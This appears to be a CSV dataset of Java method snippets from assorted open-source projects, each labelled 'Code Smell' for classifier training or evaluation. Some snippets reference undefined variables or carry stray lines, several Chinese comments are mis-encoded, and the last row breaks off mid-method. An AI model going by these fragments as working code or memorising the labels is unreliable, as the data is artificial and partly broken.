text,label,text_label
"private int findHotbarSlot(HighwayBuilder b,boolean replaceTools){
  int thrashSlot=-1;
  int slotsWithBlocks=0;
  int slotWithLeastBlocks=-1;
  int slotWithLeastBlocksCount=Integer.MAX_VALUE;
  for (int i=0; i < 9; i++) {
    ItemStack itemStack=b.mc.player.getInventory().getStack(i);
    if (itemStack.isEmpty())     return i;
    if (replaceTools && AutoTool.isTool(itemStack))     return i;
    if (b.trashItems.get().contains(itemStack.getItem()))     thrashSlot=i;
    if (itemStack.getItem() instanceof BlockItem && b.blocksToPlace.get().contains(blockItem.getBlock())) {
      slotsWithBlocks++;
      if (itemStack.getCount() < slotWithLeastBlocksCount) {
        slotWithLeastBlocksCount=itemStack.getCount();
        slotWithLeastBlocks=i;
      }
    }
  }
  if (thrashSlot != -1)   return thrashSlot;
  if (slotsWithBlocks > 1)   return slotWithLeastBlocks;
  b.error(""No empty space in hotbar."");
  return -1;
}",1,Code Smell
"@Override protected SubripSubtitle decode(byte[] bytes,int length,boolean reset){
  ArrayList<Cue> cues=new ArrayList<>();
  LongArray cueTimesUs=new LongArray();
  ParsableByteArray subripData=new ParsableByteArray(bytes,length);
  String currentLine;
  while ((currentLine=subripData.readLine()) != null) {
    if (currentLine.length() == 0) {
      continue;
    }
    try {
      Integer.parseInt(currentLine);
    }
 catch (    NumberFormatException e) {
      Log.w(TAG,""Skipping invalid index: "" + currentLine);
      continue;
    }
    boolean haveEndTimecode=false;
    currentLine=subripData.readLine();
    if (currentLine == null) {
      Log.w(TAG,""Unexpected end"");
      break;
    }
    Matcher matcher=SUBRIP_TIMING_LINE.matcher(currentLine);
    if (matcher.matches()) {
      cueTimesUs.add(parseTimecode(matcher,1));
      if (!TextUtils.isEmpty(matcher.group(6))) {
        haveEndTimecode=true;
        cueTimesUs.add(parseTimecode(matcher,6));
      }
    }
 else {
      Log.w(TAG,""Skipping invalid timing: "" + currentLine);
      continue;
    }
    textBuilder.setLength(0);
    tags.clear();
    currentLine=subripData.readLine();
    while (!TextUtils.isEmpty(currentLine)) {
      if (textBuilder.length() > 0) {
        textBuilder.append(""<br>"");
      }
      textBuilder.append(processLine(currentLine,tags));
      currentLine=subripData.readLine();
    }
    Spanned text=Html.fromHtml(textBuilder.toString());
    String alignmentTag=null;
    for (int i=0; i < tags.size(); i++) {
      String tag=tags.get(i);
      if (tag.matches(SUBRIP_ALIGNMENT_TAG)) {
        alignmentTag=tag;
        break;
      }
    }
    cues.add(buildCue(text,alignmentTag));
    if (haveEndTimecode) {
      cues.add(Cue.EMPTY);
    }
  }
  Cue[] cuesArray=new Cue[cues.size()];
  cues.toArray(cuesArray);
  long[] cueTimesUsArray=cueTimesUs.toArray();
  return new SubripSubtitle(cuesArray,cueTimesUsArray);
}",1,Code Smell
"@Override public boolean saveGroup(Group group){
  isTrue(!root.readonly(),IS_READ_ONLY);
  isTrue(storages.containsKey(group.getType()),NOT_SUPPORTED_GROUP_TYPE);
  notNull(group.getName(),NAME_REQUIRED);
  notNull(IoUtils.validateFileName(group.getName()),NAME_INVALID);
  notNull(group.getParentId(),GROUP_ID_REQUIRED);
  MagicResourceStorage<? extends MagicEntity> storage=storages.get(group.getType());
  return writeLock(() -> {
    Resource resource;
    if (Constants.ROOT_ID.equals(group.getParentId())) {
      resource=root.getDirectory(group.getType());
    }
 else {
      resource=getGroupResource(group.getParentId());
      isTrue(resource != null && resource.exists(),GROUP_NOT_FOUND);
    }
    Resource groupResource;
    GroupEvent event=new GroupEvent(group.getType(),group.getId() == null ? EventAction.CREATE : EventAction.SAVE,group);
    if (group.getId() == null || !groupCache.containsKey(group.getId())) {
      if (group.getId() == null) {
        group.setId(UUID.randomUUID().toString().replace(""-"",""""));
      }
      group.setCreateTime(System.currentTimeMillis());
      group.setCreateBy(WebUtils.currentUserName());
      groupResource=resource.getDirectory(group.getName());
      isTrue(!groupResource.exists(),FILE_SAVE_FAILURE);
      groupResource.mkdir();
    }
 else {
      Group oldGroup=groupCache.get(group.getId());
      if (storage.requirePath() && !Objects.equals(oldGroup.getPath(),group.getPath())) {
        TreeNode<Group> treeNode=tree(group.getType());
        String oldPath=oldGroup.getPath();
        oldGroup.setPath(group.getPath());
        List<MagicEntity> entities=treeNode.findTreeNode(it -> it.getId().equals(group.getId())).flat().stream().flatMap(it -> fileCache.values().stream().filter(f -> f.getGroupId().equals(it.getId()))).collect(Collectors.toList());
        for (        MagicEntity entity : entities) {
          String newMappingKey=storage.buildKey(entity);
          if (pathCache.get(group.getType()).entrySet().stream().anyMatch(entry -> entry.getValue().equals(newMappingKey) && !entry.getKey().equals(entity.getId()))) {
            oldGroup.setPath(oldPath);
            throw new InvalidArgumentException(SAVE_GROUP_PATH_CONFLICT);
          }
        }
      }
      Resource oldResource=getGroupResource(group.getId());
      groupResource=resource.getDirectory(group.getName());
      isTrue(oldResource != null && oldResource.exists(),GROUP_NOT_FOUND);
      group.setUpdateBy(WebUtils.currentUserName());
      group.setUpdateTime(System.currentTimeMillis());
      if (!Objects.equals(oldGroup.getName(),group.getName())) {
        isTrue(!groupResource.exists(),FILE_SAVE_FAILURE);
        isTrue(oldResource.renameTo(groupResource),FILE_SAVE_FAILURE);
      }
    }
    if (groupResource.getResource(Constants.GROUP_METABASE).write(JsonUtils.toJsonString(group))) {
      putGroup(group,groupResource);
      TreeNode<Group> treeNode=tree(group.getType()).findTreeNode(it -> it.getId().equals(group.getId()));
      refreshGroup(groupResource,storage);
      if (event.getAction() != EventAction.CREATE) {
        event.setEntities(treeNode.flat().stream().flatMap(g -> listFiles(g.getId()).stream()).collect(Collectors.toList()));
      }
      publisher.publishEvent(event);
      return true;
    }
    return false;
  }
);
}
",1,Code Smell
"@java.lang.Override public int getSerializedSize(){
  int size=memoizedSize;
  if (size != -1)   return size;
  size=0;
  if (metadata_ != null) {
    size+=com.google.protobuf.CodedOutputStream.computeMessageSize(1,getMetadata());
  }
{
    int dataSize=0;
    for (int i=0; i < forwardFeatureMapping_.size(); i++) {
      dataSize+=com.google.protobuf.CodedOutputStream.computeInt32SizeNoTag(forwardFeatureMapping_.getInt(i));
    }
    size+=dataSize;
    if (!getForwardFeatureMappingList().isEmpty()) {
      size+=1;
      size+=com.google.protobuf.CodedOutputStream.computeInt32SizeNoTag(dataSize);
    }
    forwardFeatureMappingMemoizedSerializedSize=dataSize;
  }
{
    int dataSize=0;
    for (int i=0; i < backwardFeatureMapping_.size(); i++) {
      dataSize+=com.google.protobuf.CodedOutputStream.computeInt32SizeNoTag(backwardFeatureMapping_.getInt(i));
    }
    size+=dataSize;
    if (!getBackwardFeatureMappingList().isEmpty()) {
      size+=1;
      size+=com.google.protobuf.CodedOutputStream.computeInt32SizeNoTag(dataSize);
    }
    backwardFeatureMappingMemoizedSerializedSize=dataSize;
  }
  if (!com.google.protobuf.GeneratedMessageV3.isStringEmpty(modelDirectory_)) {
    size+=com.google.protobuf.GeneratedMessageV3.computeStringSize(4,modelDirectory_);
  }
  if (featureConverter_ != null) {
    size+=com.google.protobuf.CodedOutputStream.computeMessageSize(5,getFeatureConverter());
  }
  if (outputConverter_ != null) {
    size+=com.google.protobuf.CodedOutputStream.computeMessageSize(6,getOutputConverter());
  }
  if (!com.google.protobuf.GeneratedMessageV3.isStringEmpty(outputName_)) {
    size+=com.google.protobuf.GeneratedMessageV3.computeStringSize(7,outputName_);
  }
  size+=unknownFields.getSerializedSize();
  memoizedSize=size;
  return size;
}",1,Code Smell
"Expression resolveCallExpressionInternal(Type targetType,String name,List<? extends ExpressionElement> inner,boolean implicit){
  int innerLength=inner.size();
  Expression result=null;
  TypedFunction resultFunction=null;
  functions:   for (  TypedFunction f : this.functionResolver.resolve(name,targetType)) {
    Parameter[] paramTypes=f.getParameters();
    if (paramTypes.length != innerLength)     continue;
    Expression[] params=new Expression[innerLength];
    for (int i=0; i < innerLength; i++) {
      ExpressionElement paramExpression=inner.get(i);
      Parameter param=paramTypes[i];
      if (param.constant() && !(paramExpression instanceof NumberToken)) {
        continue functions;
      }
      Expression expression=this.resolveExpressionInternal(param.type(),paramExpression,!implicit || innerLength > 1,implicit);
      if (expression == null)       continue functions;
      params[i]=expression;
    }
    if (result != null && f.priority() == resultFunction.priority()) {
      throw new RuntimeException(""Ambiguity, \n\told: "" + TypedFunction.format(resultFunction,"""") + ""\n\tnew: ""+ TypedFunction.format(f,""""));
    }
 else     if (resultFunction == null || f.priority() >= resultFunction.priority()) {
      result=new CallExpression(f,params);
      resultFunction=f;
    }
  }
  return result;
}",1,Code Smell
"@Override public String buildDeleteSql(QueryWrapper queryWrapper){
  List<QueryTable> queryTables=CPI.getQueryTables(queryWrapper);
  List<QueryTable> joinTables=CPI.getJoinTables(queryWrapper);
  List<QueryTable> allTables=CollectionUtil.merge(queryTables,joinTables);
  StringBuilder sqlBuilder=new StringBuilder(DELETE);
  String hint=CPI.getHint(queryWrapper);
  if (StringUtil.isNotBlank(hint)) {
    sqlBuilder.append(BLANK).append(hint).deleteCharAt(sqlBuilder.length() - 1);
  }
  if (joinTables != null && !joinTables.isEmpty()) {
    if (queryTables == null || queryTables.isEmpty()) {
      throw new IllegalArgumentException(""Delete with join sql must designate the from table."");
    }
 else     if (queryTables.size() != 1) {
      throw new IllegalArgumentException(""Delete with join sql must has 1 table only. but current has "" + queryTables.size());
    }
    QueryTable queryTable=queryTables.get(0);
    String table=getRealTable(queryTable.getName(),OperateType.DELETE);
    if (StringUtil.isNotBlank(queryTable.getSchema())) {
      sqlBuilder.append(wrap(getRealSchema(queryTable.getSchema(),table,OperateType.DELETE))).append(REFERENCE);
    }
    sqlBuilder.append(BLANK).append(wrap(getRealTable(table,OperateType.DELETE)));
  }
  sqlBuilder.append(FROM).append(StringUtil.join(DELIMITER,queryTables,queryTable -> queryTable.toSql(this,OperateType.DELETE)));
  buildJoinSql(sqlBuilder,queryWrapper,allTables,OperateType.DELETE);
  buildWhereSql(sqlBuilder,queryWrapper,allTables,false);
  buildGroupBySql(sqlBuilder,queryWrapper,allTables);
  buildHavingSql(sqlBuilder,queryWrapper,allTables);
  buildOrderBySql(sqlBuilder,queryWrapper,allTables);
  Long limitRows=CPI.getLimitRows(queryWrapper);
  Long limitOffset=CPI.getLimitOffset(queryWrapper);
  if (limitRows != null || limitOffset != null) {
    sqlBuilder=buildLimitOffsetSql(sqlBuilder,queryWrapper,limitRows,limitOffset);
  }
  List<String> endFragments=CPI.getEndFragments(queryWrapper);
  if (CollectionUtil.isNotEmpty(endFragments)) {
    for (    String endFragment : endFragments) {
      sqlBuilder.append(BLANK).append(endFragment);
    }
  }
  return sqlBuilder.toString();
}",1,Code Smell
"@Override public void onPermissionGranted(String[] permissions){
  boolean show=false;
  for (  String permission : permissions) {
    if (permission.equals(Manifest.permission.READ_EXTERNAL_STORAGE) || (Build.VERSION.SDK_INT >= 33 && permission.equals(Manifest.permission.READ_MEDIA_VIDEO))) {
      show=true;
      break;
    }
  }
  if (!show)   return;
  if (_enableOptions) {
    show=false;
    for (    String permission : permissions) {
      if (permission.equals(Manifest.permission.WRITE_EXTERNAL_STORAGE)) {
        show=true;
        break;
      }
    }
  }
  if (!show)   return;
  if (_adapter.isEmpty())   refreshDirs();
  showDialog();
}",1,Code Smell
"public static TabbyVariable parsePosition(String position,TabbyVariable baseVar,Map<Integer,TabbyVariable> args,boolean created){
  if (position == null)   return null;
  TabbyVariable retVar=null;
  String[] positions=position.split(""\\|"");
  for (  String pos : positions) {
    if (pos.contains(""&remain"")) {
      pos=pos.split(""&"")[0];
    }
    if (""this"".equals(pos)) {
      retVar=baseVar;
    }
 else     if (pos.startsWith(""param-"")) {
      int index=Integer.valueOf(pos.split(""-"")[1]);
      retVar=args.get(index);
    }
 else     if (retVar != null && StringUtils.isNumeric(pos)) {
      int index=Integer.valueOf(pos);
      TabbyVariable tempVar=retVar.getElement(index);
      if (created && tempVar == null) {
        tempVar=TabbyVariable.makeRandomInstance();
        boolean isPolluted=retVar.isPolluted();
        tempVar.getValue().setPolluted(isPolluted);
        if (isPolluted) {
          tempVar.getValue().setRelatedType(retVar.getValue().getRelatedType() + ""|"" + index);
        }
        retVar.addElement(index,tempVar);
      }
      retVar=tempVar;
    }
 else     if (retVar != null) {
      TabbyVariable tempVar=retVar.getField(pos);
      if (created && tempVar == null) {
        SootField field=retVar.getSootField(pos);
        if (field != null) {
          tempVar=retVar.getOrAddField(retVar,field);
        }
      }
      retVar=tempVar;
    }
 else {
      retVar=null;
    }
  }
  return retVar;
}",1,Code Smell
"/** 
 * add or modify flow control rule
 * @param req       Http Servlet Request
 * @param sBuffer   string buffer
 * @param result    process result
 * @return    process result
 */
private StringBuilder innAddOrUpdGroupFlowCtrlRule(HttpServletRequest req,StringBuilder sBuffer,ProcessResult result,boolean isAddOp){
  if (!WebParameterUtils.getAUDBaseInfo(req,isAddOp,null,sBuffer,result)) {
    WebParameterUtils.buildFailResult(sBuffer,result.getErrMsg());
    return sBuffer;
  }
  BaseEntity opEntity=(BaseEntity)result.getRetData();
  if (!WebParameterUtils.getStringParamValue(req,WebFieldDef.COMPSGROUPNAME,true,null,sBuffer,result)) {
    WebParameterUtils.buildFailResult(sBuffer,result.getErrMsg());
    return sBuffer;
  }
  final Set<String> groupNameSet=(Set<String>)result.getRetData();
  if (!WebParameterUtils.getQryPriorityIdParameter(req,false,TBaseConstants.META_VALUE_UNDEFINED,TServerConstants.QRY_PRIORITY_MIN_VALUE,sBuffer,result)) {
    WebParameterUtils.buildFailResult(sBuffer,result.getErrMsg());
    return sBuffer;
  }
  int qryPriorityId=(int)result.getRetData();
  if (!WebParameterUtils.getFlowCtrlStatusParamValue(req,false,null,sBuffer,result)) {
    WebParameterUtils.buildFailResult(sBuffer,result.getErrMsg());
    return sBuffer;
  }
  EnableStatus flowCtrlEnable=(EnableStatus)result.getRetData();
  int flowRuleCnt=WebParameterUtils.getAndCheckFlowRules(req,(isAddOp ? TServerConstants.BLANK_FLOWCTRL_RULES : null),sBuffer,result);
  if (!result.isSuccess()) {
    WebParameterUtils.buildFailResult(sBuffer,result.getErrMsg());
    return sBuffer;
  }
  String flowCtrlInfo=(String)result.getRetData();
  GroupResCtrlEntity ctrlEntity;
  List<GroupProcessResult> retInfoList=new ArrayList<>();
  for (  String groupName : groupNameSet) {
    ctrlEntity=defMetaDataService.getGroupCtrlConf(groupName);
    if (ctrlEntity == null) {
      if (isAddOp) {
        retInfoList.add(defMetaDataService.insertGroupCtrlConf(opEntity,groupName,qryPriorityId,flowCtrlEnable,flowRuleCnt,flowCtrlInfo,sBuffer,result));
      }
 else {
        result.setFailResult(DataOpErrCode.DERR_NOT_EXIST.getCode(),DataOpErrCode.DERR_NOT_EXIST.getDescription());
        retInfoList.add(new GroupProcessResult(groupName,"""",result));
      }
    }
 else {
      retInfoList.add(defMetaDataService.insertGroupCtrlConf(opEntity,groupName,qryPriorityId,flowCtrlEnable,flowRuleCnt,flowCtrlInfo,sBuffer,result));
    }
  }
  return buildRetInfo(retInfoList,sBuffer);
}
",1,Code Smell
"/** 
 * DP鏂规硶鍖归厤
 * @param s
 * @param p
 * @return
 */
public boolean isMatch2(String s,String p){
  int n=s.length() + 1, m=p.length() + 1;
  boolean[][] dp=new boolean[m][n];
  dp[0][0]=true;
  if (m > 2) {
    for (int i=1; i < m - 1; i+=2) {
      if (p.charAt(i) == '*') {
        dp[i][0]=dp[i - 1][0];
        dp[i + 1][0]=dp[i][0];
      }
    }
  }
  for (int i=1; i < m; i++) {
    for (int j=1; j < n; j++) {
      char pat=p.charAt(i - 1);
      dp[i][j]=dp[i - 1][j - 1] && (s.charAt(j - 1) == pat || pat == '.');
      if (pat == '*' && i >= 2) {
        if (dp[i][j - 1] || dp[i - 1][j - 1]) {
          dp[i][j]=dp[i - 2][j] || (s.charAt(j - 1) == p.charAt(i - 2) || p.charAt(i - 2) == '.');
        }
 else {
          dp[i][j]=dp[i - 2][j];
        }
      }
    }
  }
  return dp[m - 1][n - 1];
}",1,Code Smell
"/** 
 * 瀵绘壘鏃嬭浆鏁扮粍鐩爣鍊�
 * @param nums
 * @param target
 * @return
 */
public int search(int[] nums,int target){
  int n=nums.length;
  if (n == 0) {
    return -1;
  }
  if (n == 1) {
    return nums[0] == target ? 0 : -1;
  }
  int l=0, r=n - 1;
  while (l <= r) {
    int mid=(l + r) / 2;
    if (nums[mid] == target) {
      return mid;
    }
    if (nums[0] <= nums[mid]) {
      if (nums[0] <= target && target < nums[mid]) {
        r=mid - 1;
      }
 else {
        l=mid + 1;
      }
    }
 else {
      if (nums[mid] < target && target <= nums[n - 1]) {
        l=mid + 1;
      }
 else {
        r=mid - 1;
      }
    }
  }
  return -1;
}",1,Code Smell
"@Override protected void dispatchDraw(Canvas canvas){
  if (counterView != null) {
    counterOffset.set((counterView.counterDrawable.getWidth() * 0.85f + AndroidUtilities.dp(3)) / 2f);
    counterOffset2.set(getMeasuredWidth() / 2f + (overlayTextView.getDrawable().getWidth()) / 2f + AndroidUtilities.dp(3));
    overlayTextView.setTranslationX(-counterOffset.get());
    counterView.setTranslationX(counterOffset2.get() - counterOffset.get());
  }
 else {
    if (overlayTextView != null) {
      overlayTextView.setTranslationX(0);
    }
  }
  AndroidUtilities.rectTmp.set(0,0,getMeasuredWidth(),getMeasuredHeight());
  if (overlayProgress != 1f || !drawOverlayColor) {
    if (inc) {
      progress+=16f / 1000f;
      if (progress > 3) {
        inc=false;
      }
    }
 else {
      progress-=16f / 1000f;
      if (progress < 1) {
        inc=true;
      }
    }
    PremiumGradient.getInstance().updateMainGradientMatrix(0,0,getMeasuredWidth(),getMeasuredHeight(),-getMeasuredWidth() * 0.1f * progress,0);
    canvas.drawRoundRect(AndroidUtilities.rectTmp,radius,radius,PremiumGradient.getInstance().getMainGradientPaint());
    invalidate();
  }
  if (!BuildVars.IS_BILLING_UNAVAILABLE && !isFlickerDisabled) {
    flickerDrawable.setParentWidth(getMeasuredWidth());
    flickerDrawable.draw(canvas,AndroidUtilities.rectTmp,radius,null);
  }
  if (overlayProgress != 0 && drawOverlayColor) {
    paintOverlayPaint.setAlpha((int)(255 * overlayProgress));
    if (overlayProgress != 1f) {
      path.rewind();
      path.addCircle(getMeasuredWidth() / 2f,getMeasuredHeight() / 2f,Math.max(getMeasuredWidth(),getMeasuredHeight()) * 1.4f * overlayProgress,Path.Direction.CW);
      canvas.save();
      canvas.clipPath(path);
      canvas.drawRoundRect(AndroidUtilities.rectTmp,radius,radius,paintOverlayPaint);
      canvas.restore();
    }
 else {
      canvas.drawRoundRect(AndroidUtilities.rectTmp,radius,radius,paintOverlayPaint);
    }
  }
  super.dispatchDraw(canvas);
}",1,Code Smell
"/** 
 * Returns a string reporting the value of each declared field, via reflection. Static and transient fields are automatically skipped. Produces output like ""SimpleClassName[integer=1234,string=""hello"",character='c',intArray=[1,2,3]]"".
 */
public static String toString(Object o){
  Class<?> c=o.getClass();
  StringBuilder sb=new StringBuilder();
  sb.append(c.getSimpleName()).append('[');
  int i=0;
  for (  Field f : c.getDeclaredFields()) {
    if ((f.getModifiers() & (Modifier.STATIC | Modifier.TRANSIENT)) != 0) {
      continue;
    }
    f.setAccessible(true);
    try {
      Object value=f.get(o);
      if (i++ > 0) {
        sb.append(',');
      }
      sb.append(f.getName());
      sb.append('=');
      if (value.getClass().isArray()) {
        if (value.getClass() == boolean[].class) {
          sb.append(Arrays.toString((boolean[])value));
        }
 else         if (value.getClass() == byte[].class) {
          sb.append(Arrays.toString((byte[])value));
        }
 else         if (value.getClass() == char[].class) {
          sb.append(Arrays.toString((char[])value));
        }
 else         if (value.getClass() == double[].class) {
          sb.append(Arrays.toString((double[])value));
        }
 else         if (value.getClass() == float[].class) {
          sb.append(Arrays.toString((float[])value));
        }
 else         if (value.getClass() == int[].class) {
          sb.append(Arrays.toString((int[])value));
        }
 else         if (value.getClass() == long[].class) {
          sb.append(Arrays.toString((long[])value));
        }
 else         if (value.getClass() == short[].class) {
          sb.append(Arrays.toString((short[])value));
        }
 else {
          sb.append(Arrays.toString((Object[])value));
        }
      }
 else       if (value.getClass() == Character.class) {
        sb.append('\'').append(value).append('\'');
      }
 else       if (value.getClass() == String.class) {
        sb.append('""').append(value).append('""');
      }
 else {
        sb.append(value);
      }
    }
 catch (    IllegalAccessException unexpected) {
      throw new AssertionError(unexpected);
    }
  }
  sb.append(""]"");
  return sb.toString();
}",1,Code Smell
"private MySqlRecords pollSplitRecords() throws InterruptedException {
  Iterator<SourceRecords> dataIt;
  if (currentReader == null) {
    if (binlogSplits.size() > 0) {
      MySqlSplit nextSplit=binlogSplits.poll();
      currentSplitId=nextSplit.splitId();
      currentReader=getBinlogSplitReader();
      currentReader.submitSplit(nextSplit);
    }
 else     if (snapshotSplits.size() > 0) {
      MySqlSplit nextSplit=snapshotSplits.poll();
      currentSplitId=nextSplit.splitId();
      currentReader=getSnapshotSplitReader();
      currentReader.submitSplit(nextSplit);
    }
 else {
      LOG.info(""No available split to read."");
    }
    dataIt=currentReader.pollSplitRecords();
    return dataIt == null ? finishedSplit() : forRecords(dataIt);
  }
 else   if (currentReader instanceof SnapshotSplitReader) {
    dataIt=currentReader.pollSplitRecords();
    if (dataIt != null) {
      MySqlRecords records;
      if (context.isHasAssignedBinlogSplit()) {
        records=forNewAddedTableFinishedSplit(currentSplitId,dataIt);
        closeSnapshotReader();
        closeBinlogReader();
      }
 else {
        records=forRecords(dataIt);
        MySqlSplit nextSplit=snapshotSplits.poll();
        if (nextSplit != null) {
          currentSplitId=nextSplit.splitId();
          currentReader.submitSplit(nextSplit);
        }
 else {
          closeSnapshotReader();
        }
      }
      return records;
    }
 else {
      return finishedSplit();
    }
  }
 else   if (currentReader instanceof BinlogSplitReader) {
    dataIt=currentReader.pollSplitRecords();
    if (dataIt != null) {
      MySqlSplit nextSplit=snapshotSplits.poll();
      if (nextSplit != null) {
        closeBinlogReader();
        LOG.info(""It's turn to switch next fetch reader to snapshot split reader"");
        currentSplitId=nextSplit.splitId();
        currentReader=getSnapshotSplitReader();
        currentReader.submitSplit(nextSplit);
      }
      return MySqlRecords.forBinlogRecords(BINLOG_SPLIT_ID,dataIt);
    }
 else {
      closeBinlogReader();
      return finishedSplit();
    }
  }
 else {
    throw new IllegalStateException(""Unsupported reader type."");
  }
}",1,Code Smell
"String getFileName(int index);
private String getFileName(int index){
  if (index < 0) {
    return null;
  }
  if (!secureDocuments.isEmpty()) {
    if (index >= secureDocuments.size()) {
      return null;
    }
    SecureDocument location=secureDocuments.get(index);
    return location.secureFile.dc_id + ""_"" + location.secureFile.id+ "".jpg"";
  }
 else   if (!imagesArrLocations.isEmpty() || !imagesArr.isEmpty()) {
    if (!imagesArrLocations.isEmpty()) {
      if (index >= imagesArrLocations.size()) {
        return null;
      }
      ImageLocation location=imagesArrLocations.get(index);
      ImageLocation videoLocation=imagesArrLocationsVideo.get(index);
      if (location == null) {
        return null;
      }
      if (videoLocation != null && videoLocation != location) {
        return videoLocation.location.volume_id + ""_"" + videoLocation.location.local_id+ "".mp4"";
      }
 else {
        return location.location.volume_id + ""_"" + location.location.local_id+ "".jpg"";
      }
    }
 else {
      if (index >= imagesArr.size()) {
        return null;
      }
      return FileLoader.getMessageFileName(imagesArr.get(index).messageOwner);
    }
  }
 else   if (!imagesArrLocals.isEmpty()) {
    if (index >= imagesArrLocals.size()) {
      return null;
    }
    Object object=imagesArrLocals.get(index);
    if (object instanceof MediaController.SearchImage) {
      MediaController.SearchImage searchImage=((MediaController.SearchImage)object);
      return searchImage.getAttachName();
    }
 else     if (object instanceof TLRPC.BotInlineResult) {
      TLRPC.BotInlineResult botInlineResult=(TLRPC.BotInlineResult)object;
      if (botInlineResult.document != null) {
        return FileLoader.getAttachFileName(botInlineResult.document);
      }
 else       if (botInlineResult.photo != null) {
        TLRPC.PhotoSize sizeFull=FileLoader.getClosestPhotoSizeWithSize(botInlineResult.photo.sizes,AndroidUtilities.getPhotoSize());
        return FileLoader.getAttachFileName(sizeFull);
      }
 else       if (botInlineResult.content instanceof TLRPC.TL_webDocument) {
        return Utilities.MD5(botInlineResult.content.url) + ""."" + ImageLoader.getHttpUrlExtension(botInlineResult.content.url,FileLoader.getMimeTypePart(botInlineResult.content.mime_type));
      }
    }
  }
 else   if (pageBlocksAdapter != null) {
    return pageBlocksAdapter.getFileName(index);
  }
  return null;
}",1,Code Smell
"private void fill(Brush brush,boolean registerUndo,Runnable onDone){
  if (!canFill || lastLocation == null) {
    return;
  }
  if (brush == null) {
    brush=renderView.getCurrentBrush();
  }
  if (brush instanceof Brush.Elliptical || brush instanceof Brush.Neon) {
    brush=new Brush.Radial();
  }
  canFill=false;
  renderView.getPainting().clearStroke();
  pointsCount=0;
  realPointsCount=0;
  lastAngleSet=false;
  beganDrawing=false;
  if (registerUndo) {
    renderView.onBeganDrawing();
  }
  Size size=renderView.getPainting().getSize();
  float R=Math.max(Math.max(distance((float)lastLocation.x,(float)lastLocation.y,0,0),distance((float)lastLocation.x,(float)lastLocation.y,size.width,0)),Math.max(distance((float)lastLocation.x,(float)lastLocation.y,0,size.height),distance((float)lastLocation.x,(float)lastLocation.y,size.width,size.height))) / 0.84f;
  if (arrowAnimator != null) {
    arrowAnimator.cancel();
    arrowAnimator=null;
  }
  if (fillAnimator != null) {
    fillAnimator.cancel();
    fillAnimator=null;
  }
  final Point point=new Point(lastLocation.x,lastLocation.y,1);
  final Brush finalBrush=brush;
  fillAnimator=ValueAnimator.ofFloat(0,1);
  fillAnimator.addUpdateListener(anm -> {
    float t=(float)anm.getAnimatedValue();
    Path path=new Path(new Point[]{point});
    int color=finalBrush.isEraser() ? 0xffffffff : renderView.getCurrentColor();
    path.setup(color,t * R,finalBrush);
    renderView.getPainting().paintStroke(path,true,true,null);
  }
);
  fillAnimator.addListener(new AnimatorListenerAdapter(){
    @Override public void onAnimationEnd(    Animator animation){
      fillAnimator=null;
      Path path=new Path(new Point[]{point});
      path.setup(renderView.getCurrentColor(),1f * R,finalBrush);
      int color=finalBrush.isEraser() ? 0xffffffff : renderView.getCurrentColor();
      renderView.getPainting().commitPath(path,color,registerUndo,null);
      if (registerUndo) {
        renderView.onFinishedDrawing(true);
      }
      if (onDone != null) {
        onDone.run();
      }
    }
  }
);
  fillAnimator.setDuration(450);
  fillAnimator.setInterpolator(CubicBezierInterpolator.EASE_OUT_QUINT);
  fillAnimator.start();
  if (registerUndo) {
    BotWebViewVibrationEffect.IMPACT_HEAVY.vibrate();
  }
}",1,Code Smell
"/** 
 * Intercept the target instance method.
 * @param obj          target class instance.
 * @param allArguments all method arguments
 * @param method       method description.
 * @param zuper        the origin call ref.
 * @return the return value of target instance method.
 * @throws Exception only throw exception because of zuper.call() or unexpected exception in sky-walking ( This is abug, if anything triggers this condition ).
 */
@RuntimeType public static Object intercept(@This Object obj,@AllArguments Object[] allArguments,@Morph OverrideCallable zuper,@Origin Method method) throws Throwable {
  EnhancedInstance targetObject=(EnhancedInstance)obj;
  prepare();
  MethodInterceptResult result=new MethodInterceptResult();
  try {
    if (INTERCEPTOR != null) {
      INTERCEPTOR.beforeMethod(targetObject,method,allArguments,method.getParameterTypes(),result);
    }
  }
 catch (  Throwable t) {
    if (LOGGER != null) {
      LOGGER.error(t,""class[{}] before method[{}] intercept failure"",obj.getClass(),method.getName());
    }
  }
  Object ret=null;
  try {
    if (!result.isContinue()) {
      ret=result._ret();
    }
 else {
      ret=zuper.call(allArguments);
    }
  }
 catch (  Throwable t) {
    try {
      if (INTERCEPTOR != null) {
        INTERCEPTOR.handleMethodException(targetObject,method,allArguments,method.getParameterTypes(),t);
      }
    }
 catch (    Throwable t2) {
      if (LOGGER != null) {
        LOGGER.error(t2,""class[{}] handle method[{}] exception failure"",obj.getClass(),method.getName());
      }
    }
    throw t;
  }
 finally {
    try {
      if (INTERCEPTOR != null) {
        ret=INTERCEPTOR.afterMethod(targetObject,method,allArguments,method.getParameterTypes(),ret);
      }
    }
 catch (    Throwable t) {
      if (LOGGER != null) {
        LOGGER.error(t,""class[{}] after method[{}] intercept failure"",obj.getClass(),method.getName());
      }
    }
  }
  return ret;
}",1,Code Smell
"@Override public String playerContent(String flag,String id,List<String> vipFlags){
  try {
    String[] infos=id.split(""\\+"");
    String shareTk=getShareTk(infos[0],"""");
    refreshTk();
    if (!accessTk.isEmpty()) {
      JSONObject json=new JSONObject();
      json.put(""share_id"",infos[0]);
      json.put(""category"",""live_transcoding"");
      json.put(""file_id"",infos[1]);
      json.put(""template_id"","""");
      HashMap<String,String> headers=new HashMap<>();
      headers.put(""x-share-token"",shareTk);
      headers.put(""authorization"",accessTk);
      OKCallBack.OKCallBackString callback=new OKCallBack.OKCallBackString(){
        @Override public void onFailure(        Call call,        Exception e){
        }
        @Override public void onResponse(        String response){
          String videoUrl="""";
          try {
            JSONArray playList=new JSONObject(response).getJSONObject(""video_preview_play_info"").getJSONArray(""live_transcoding_task_list"");
            String[] orders=new String[]{""FHD"",""HD"",""SD""};
            for (            String or : orders) {
              for (int i=0; i < playList.length(); i++) {
                JSONObject obj=playList.getJSONObject(i);
                if (obj.optString(""template_id"").equals(or)) {
                  videoUrl=obj.getString(""url"");
                  break;
                }
              }
              if (!videoUrl.isEmpty())               break;
            }
            if (videoUrl.isEmpty() && playList.length() > 0) {
              videoUrl=playList.getJSONObject(0).getString(""url"");
            }
          }
 catch (          JSONException e) {
          }
 finally {
            setResult(videoUrl);
          }
        }
      }
;
      OkHttpUtil.postJson(OkHttpUtil.defaultClient(),""https://api.aliyundrive.com/v2/file/get_share_link_video_preview_play_info"",json.toString(),headers,callback);
      JSONArray playList=new JSONObject(callback.getResult()).getJSONObject(""video_preview_play_info"").getJSONArray(""live_transcoding_task_list"");
      String videoUrl="""";
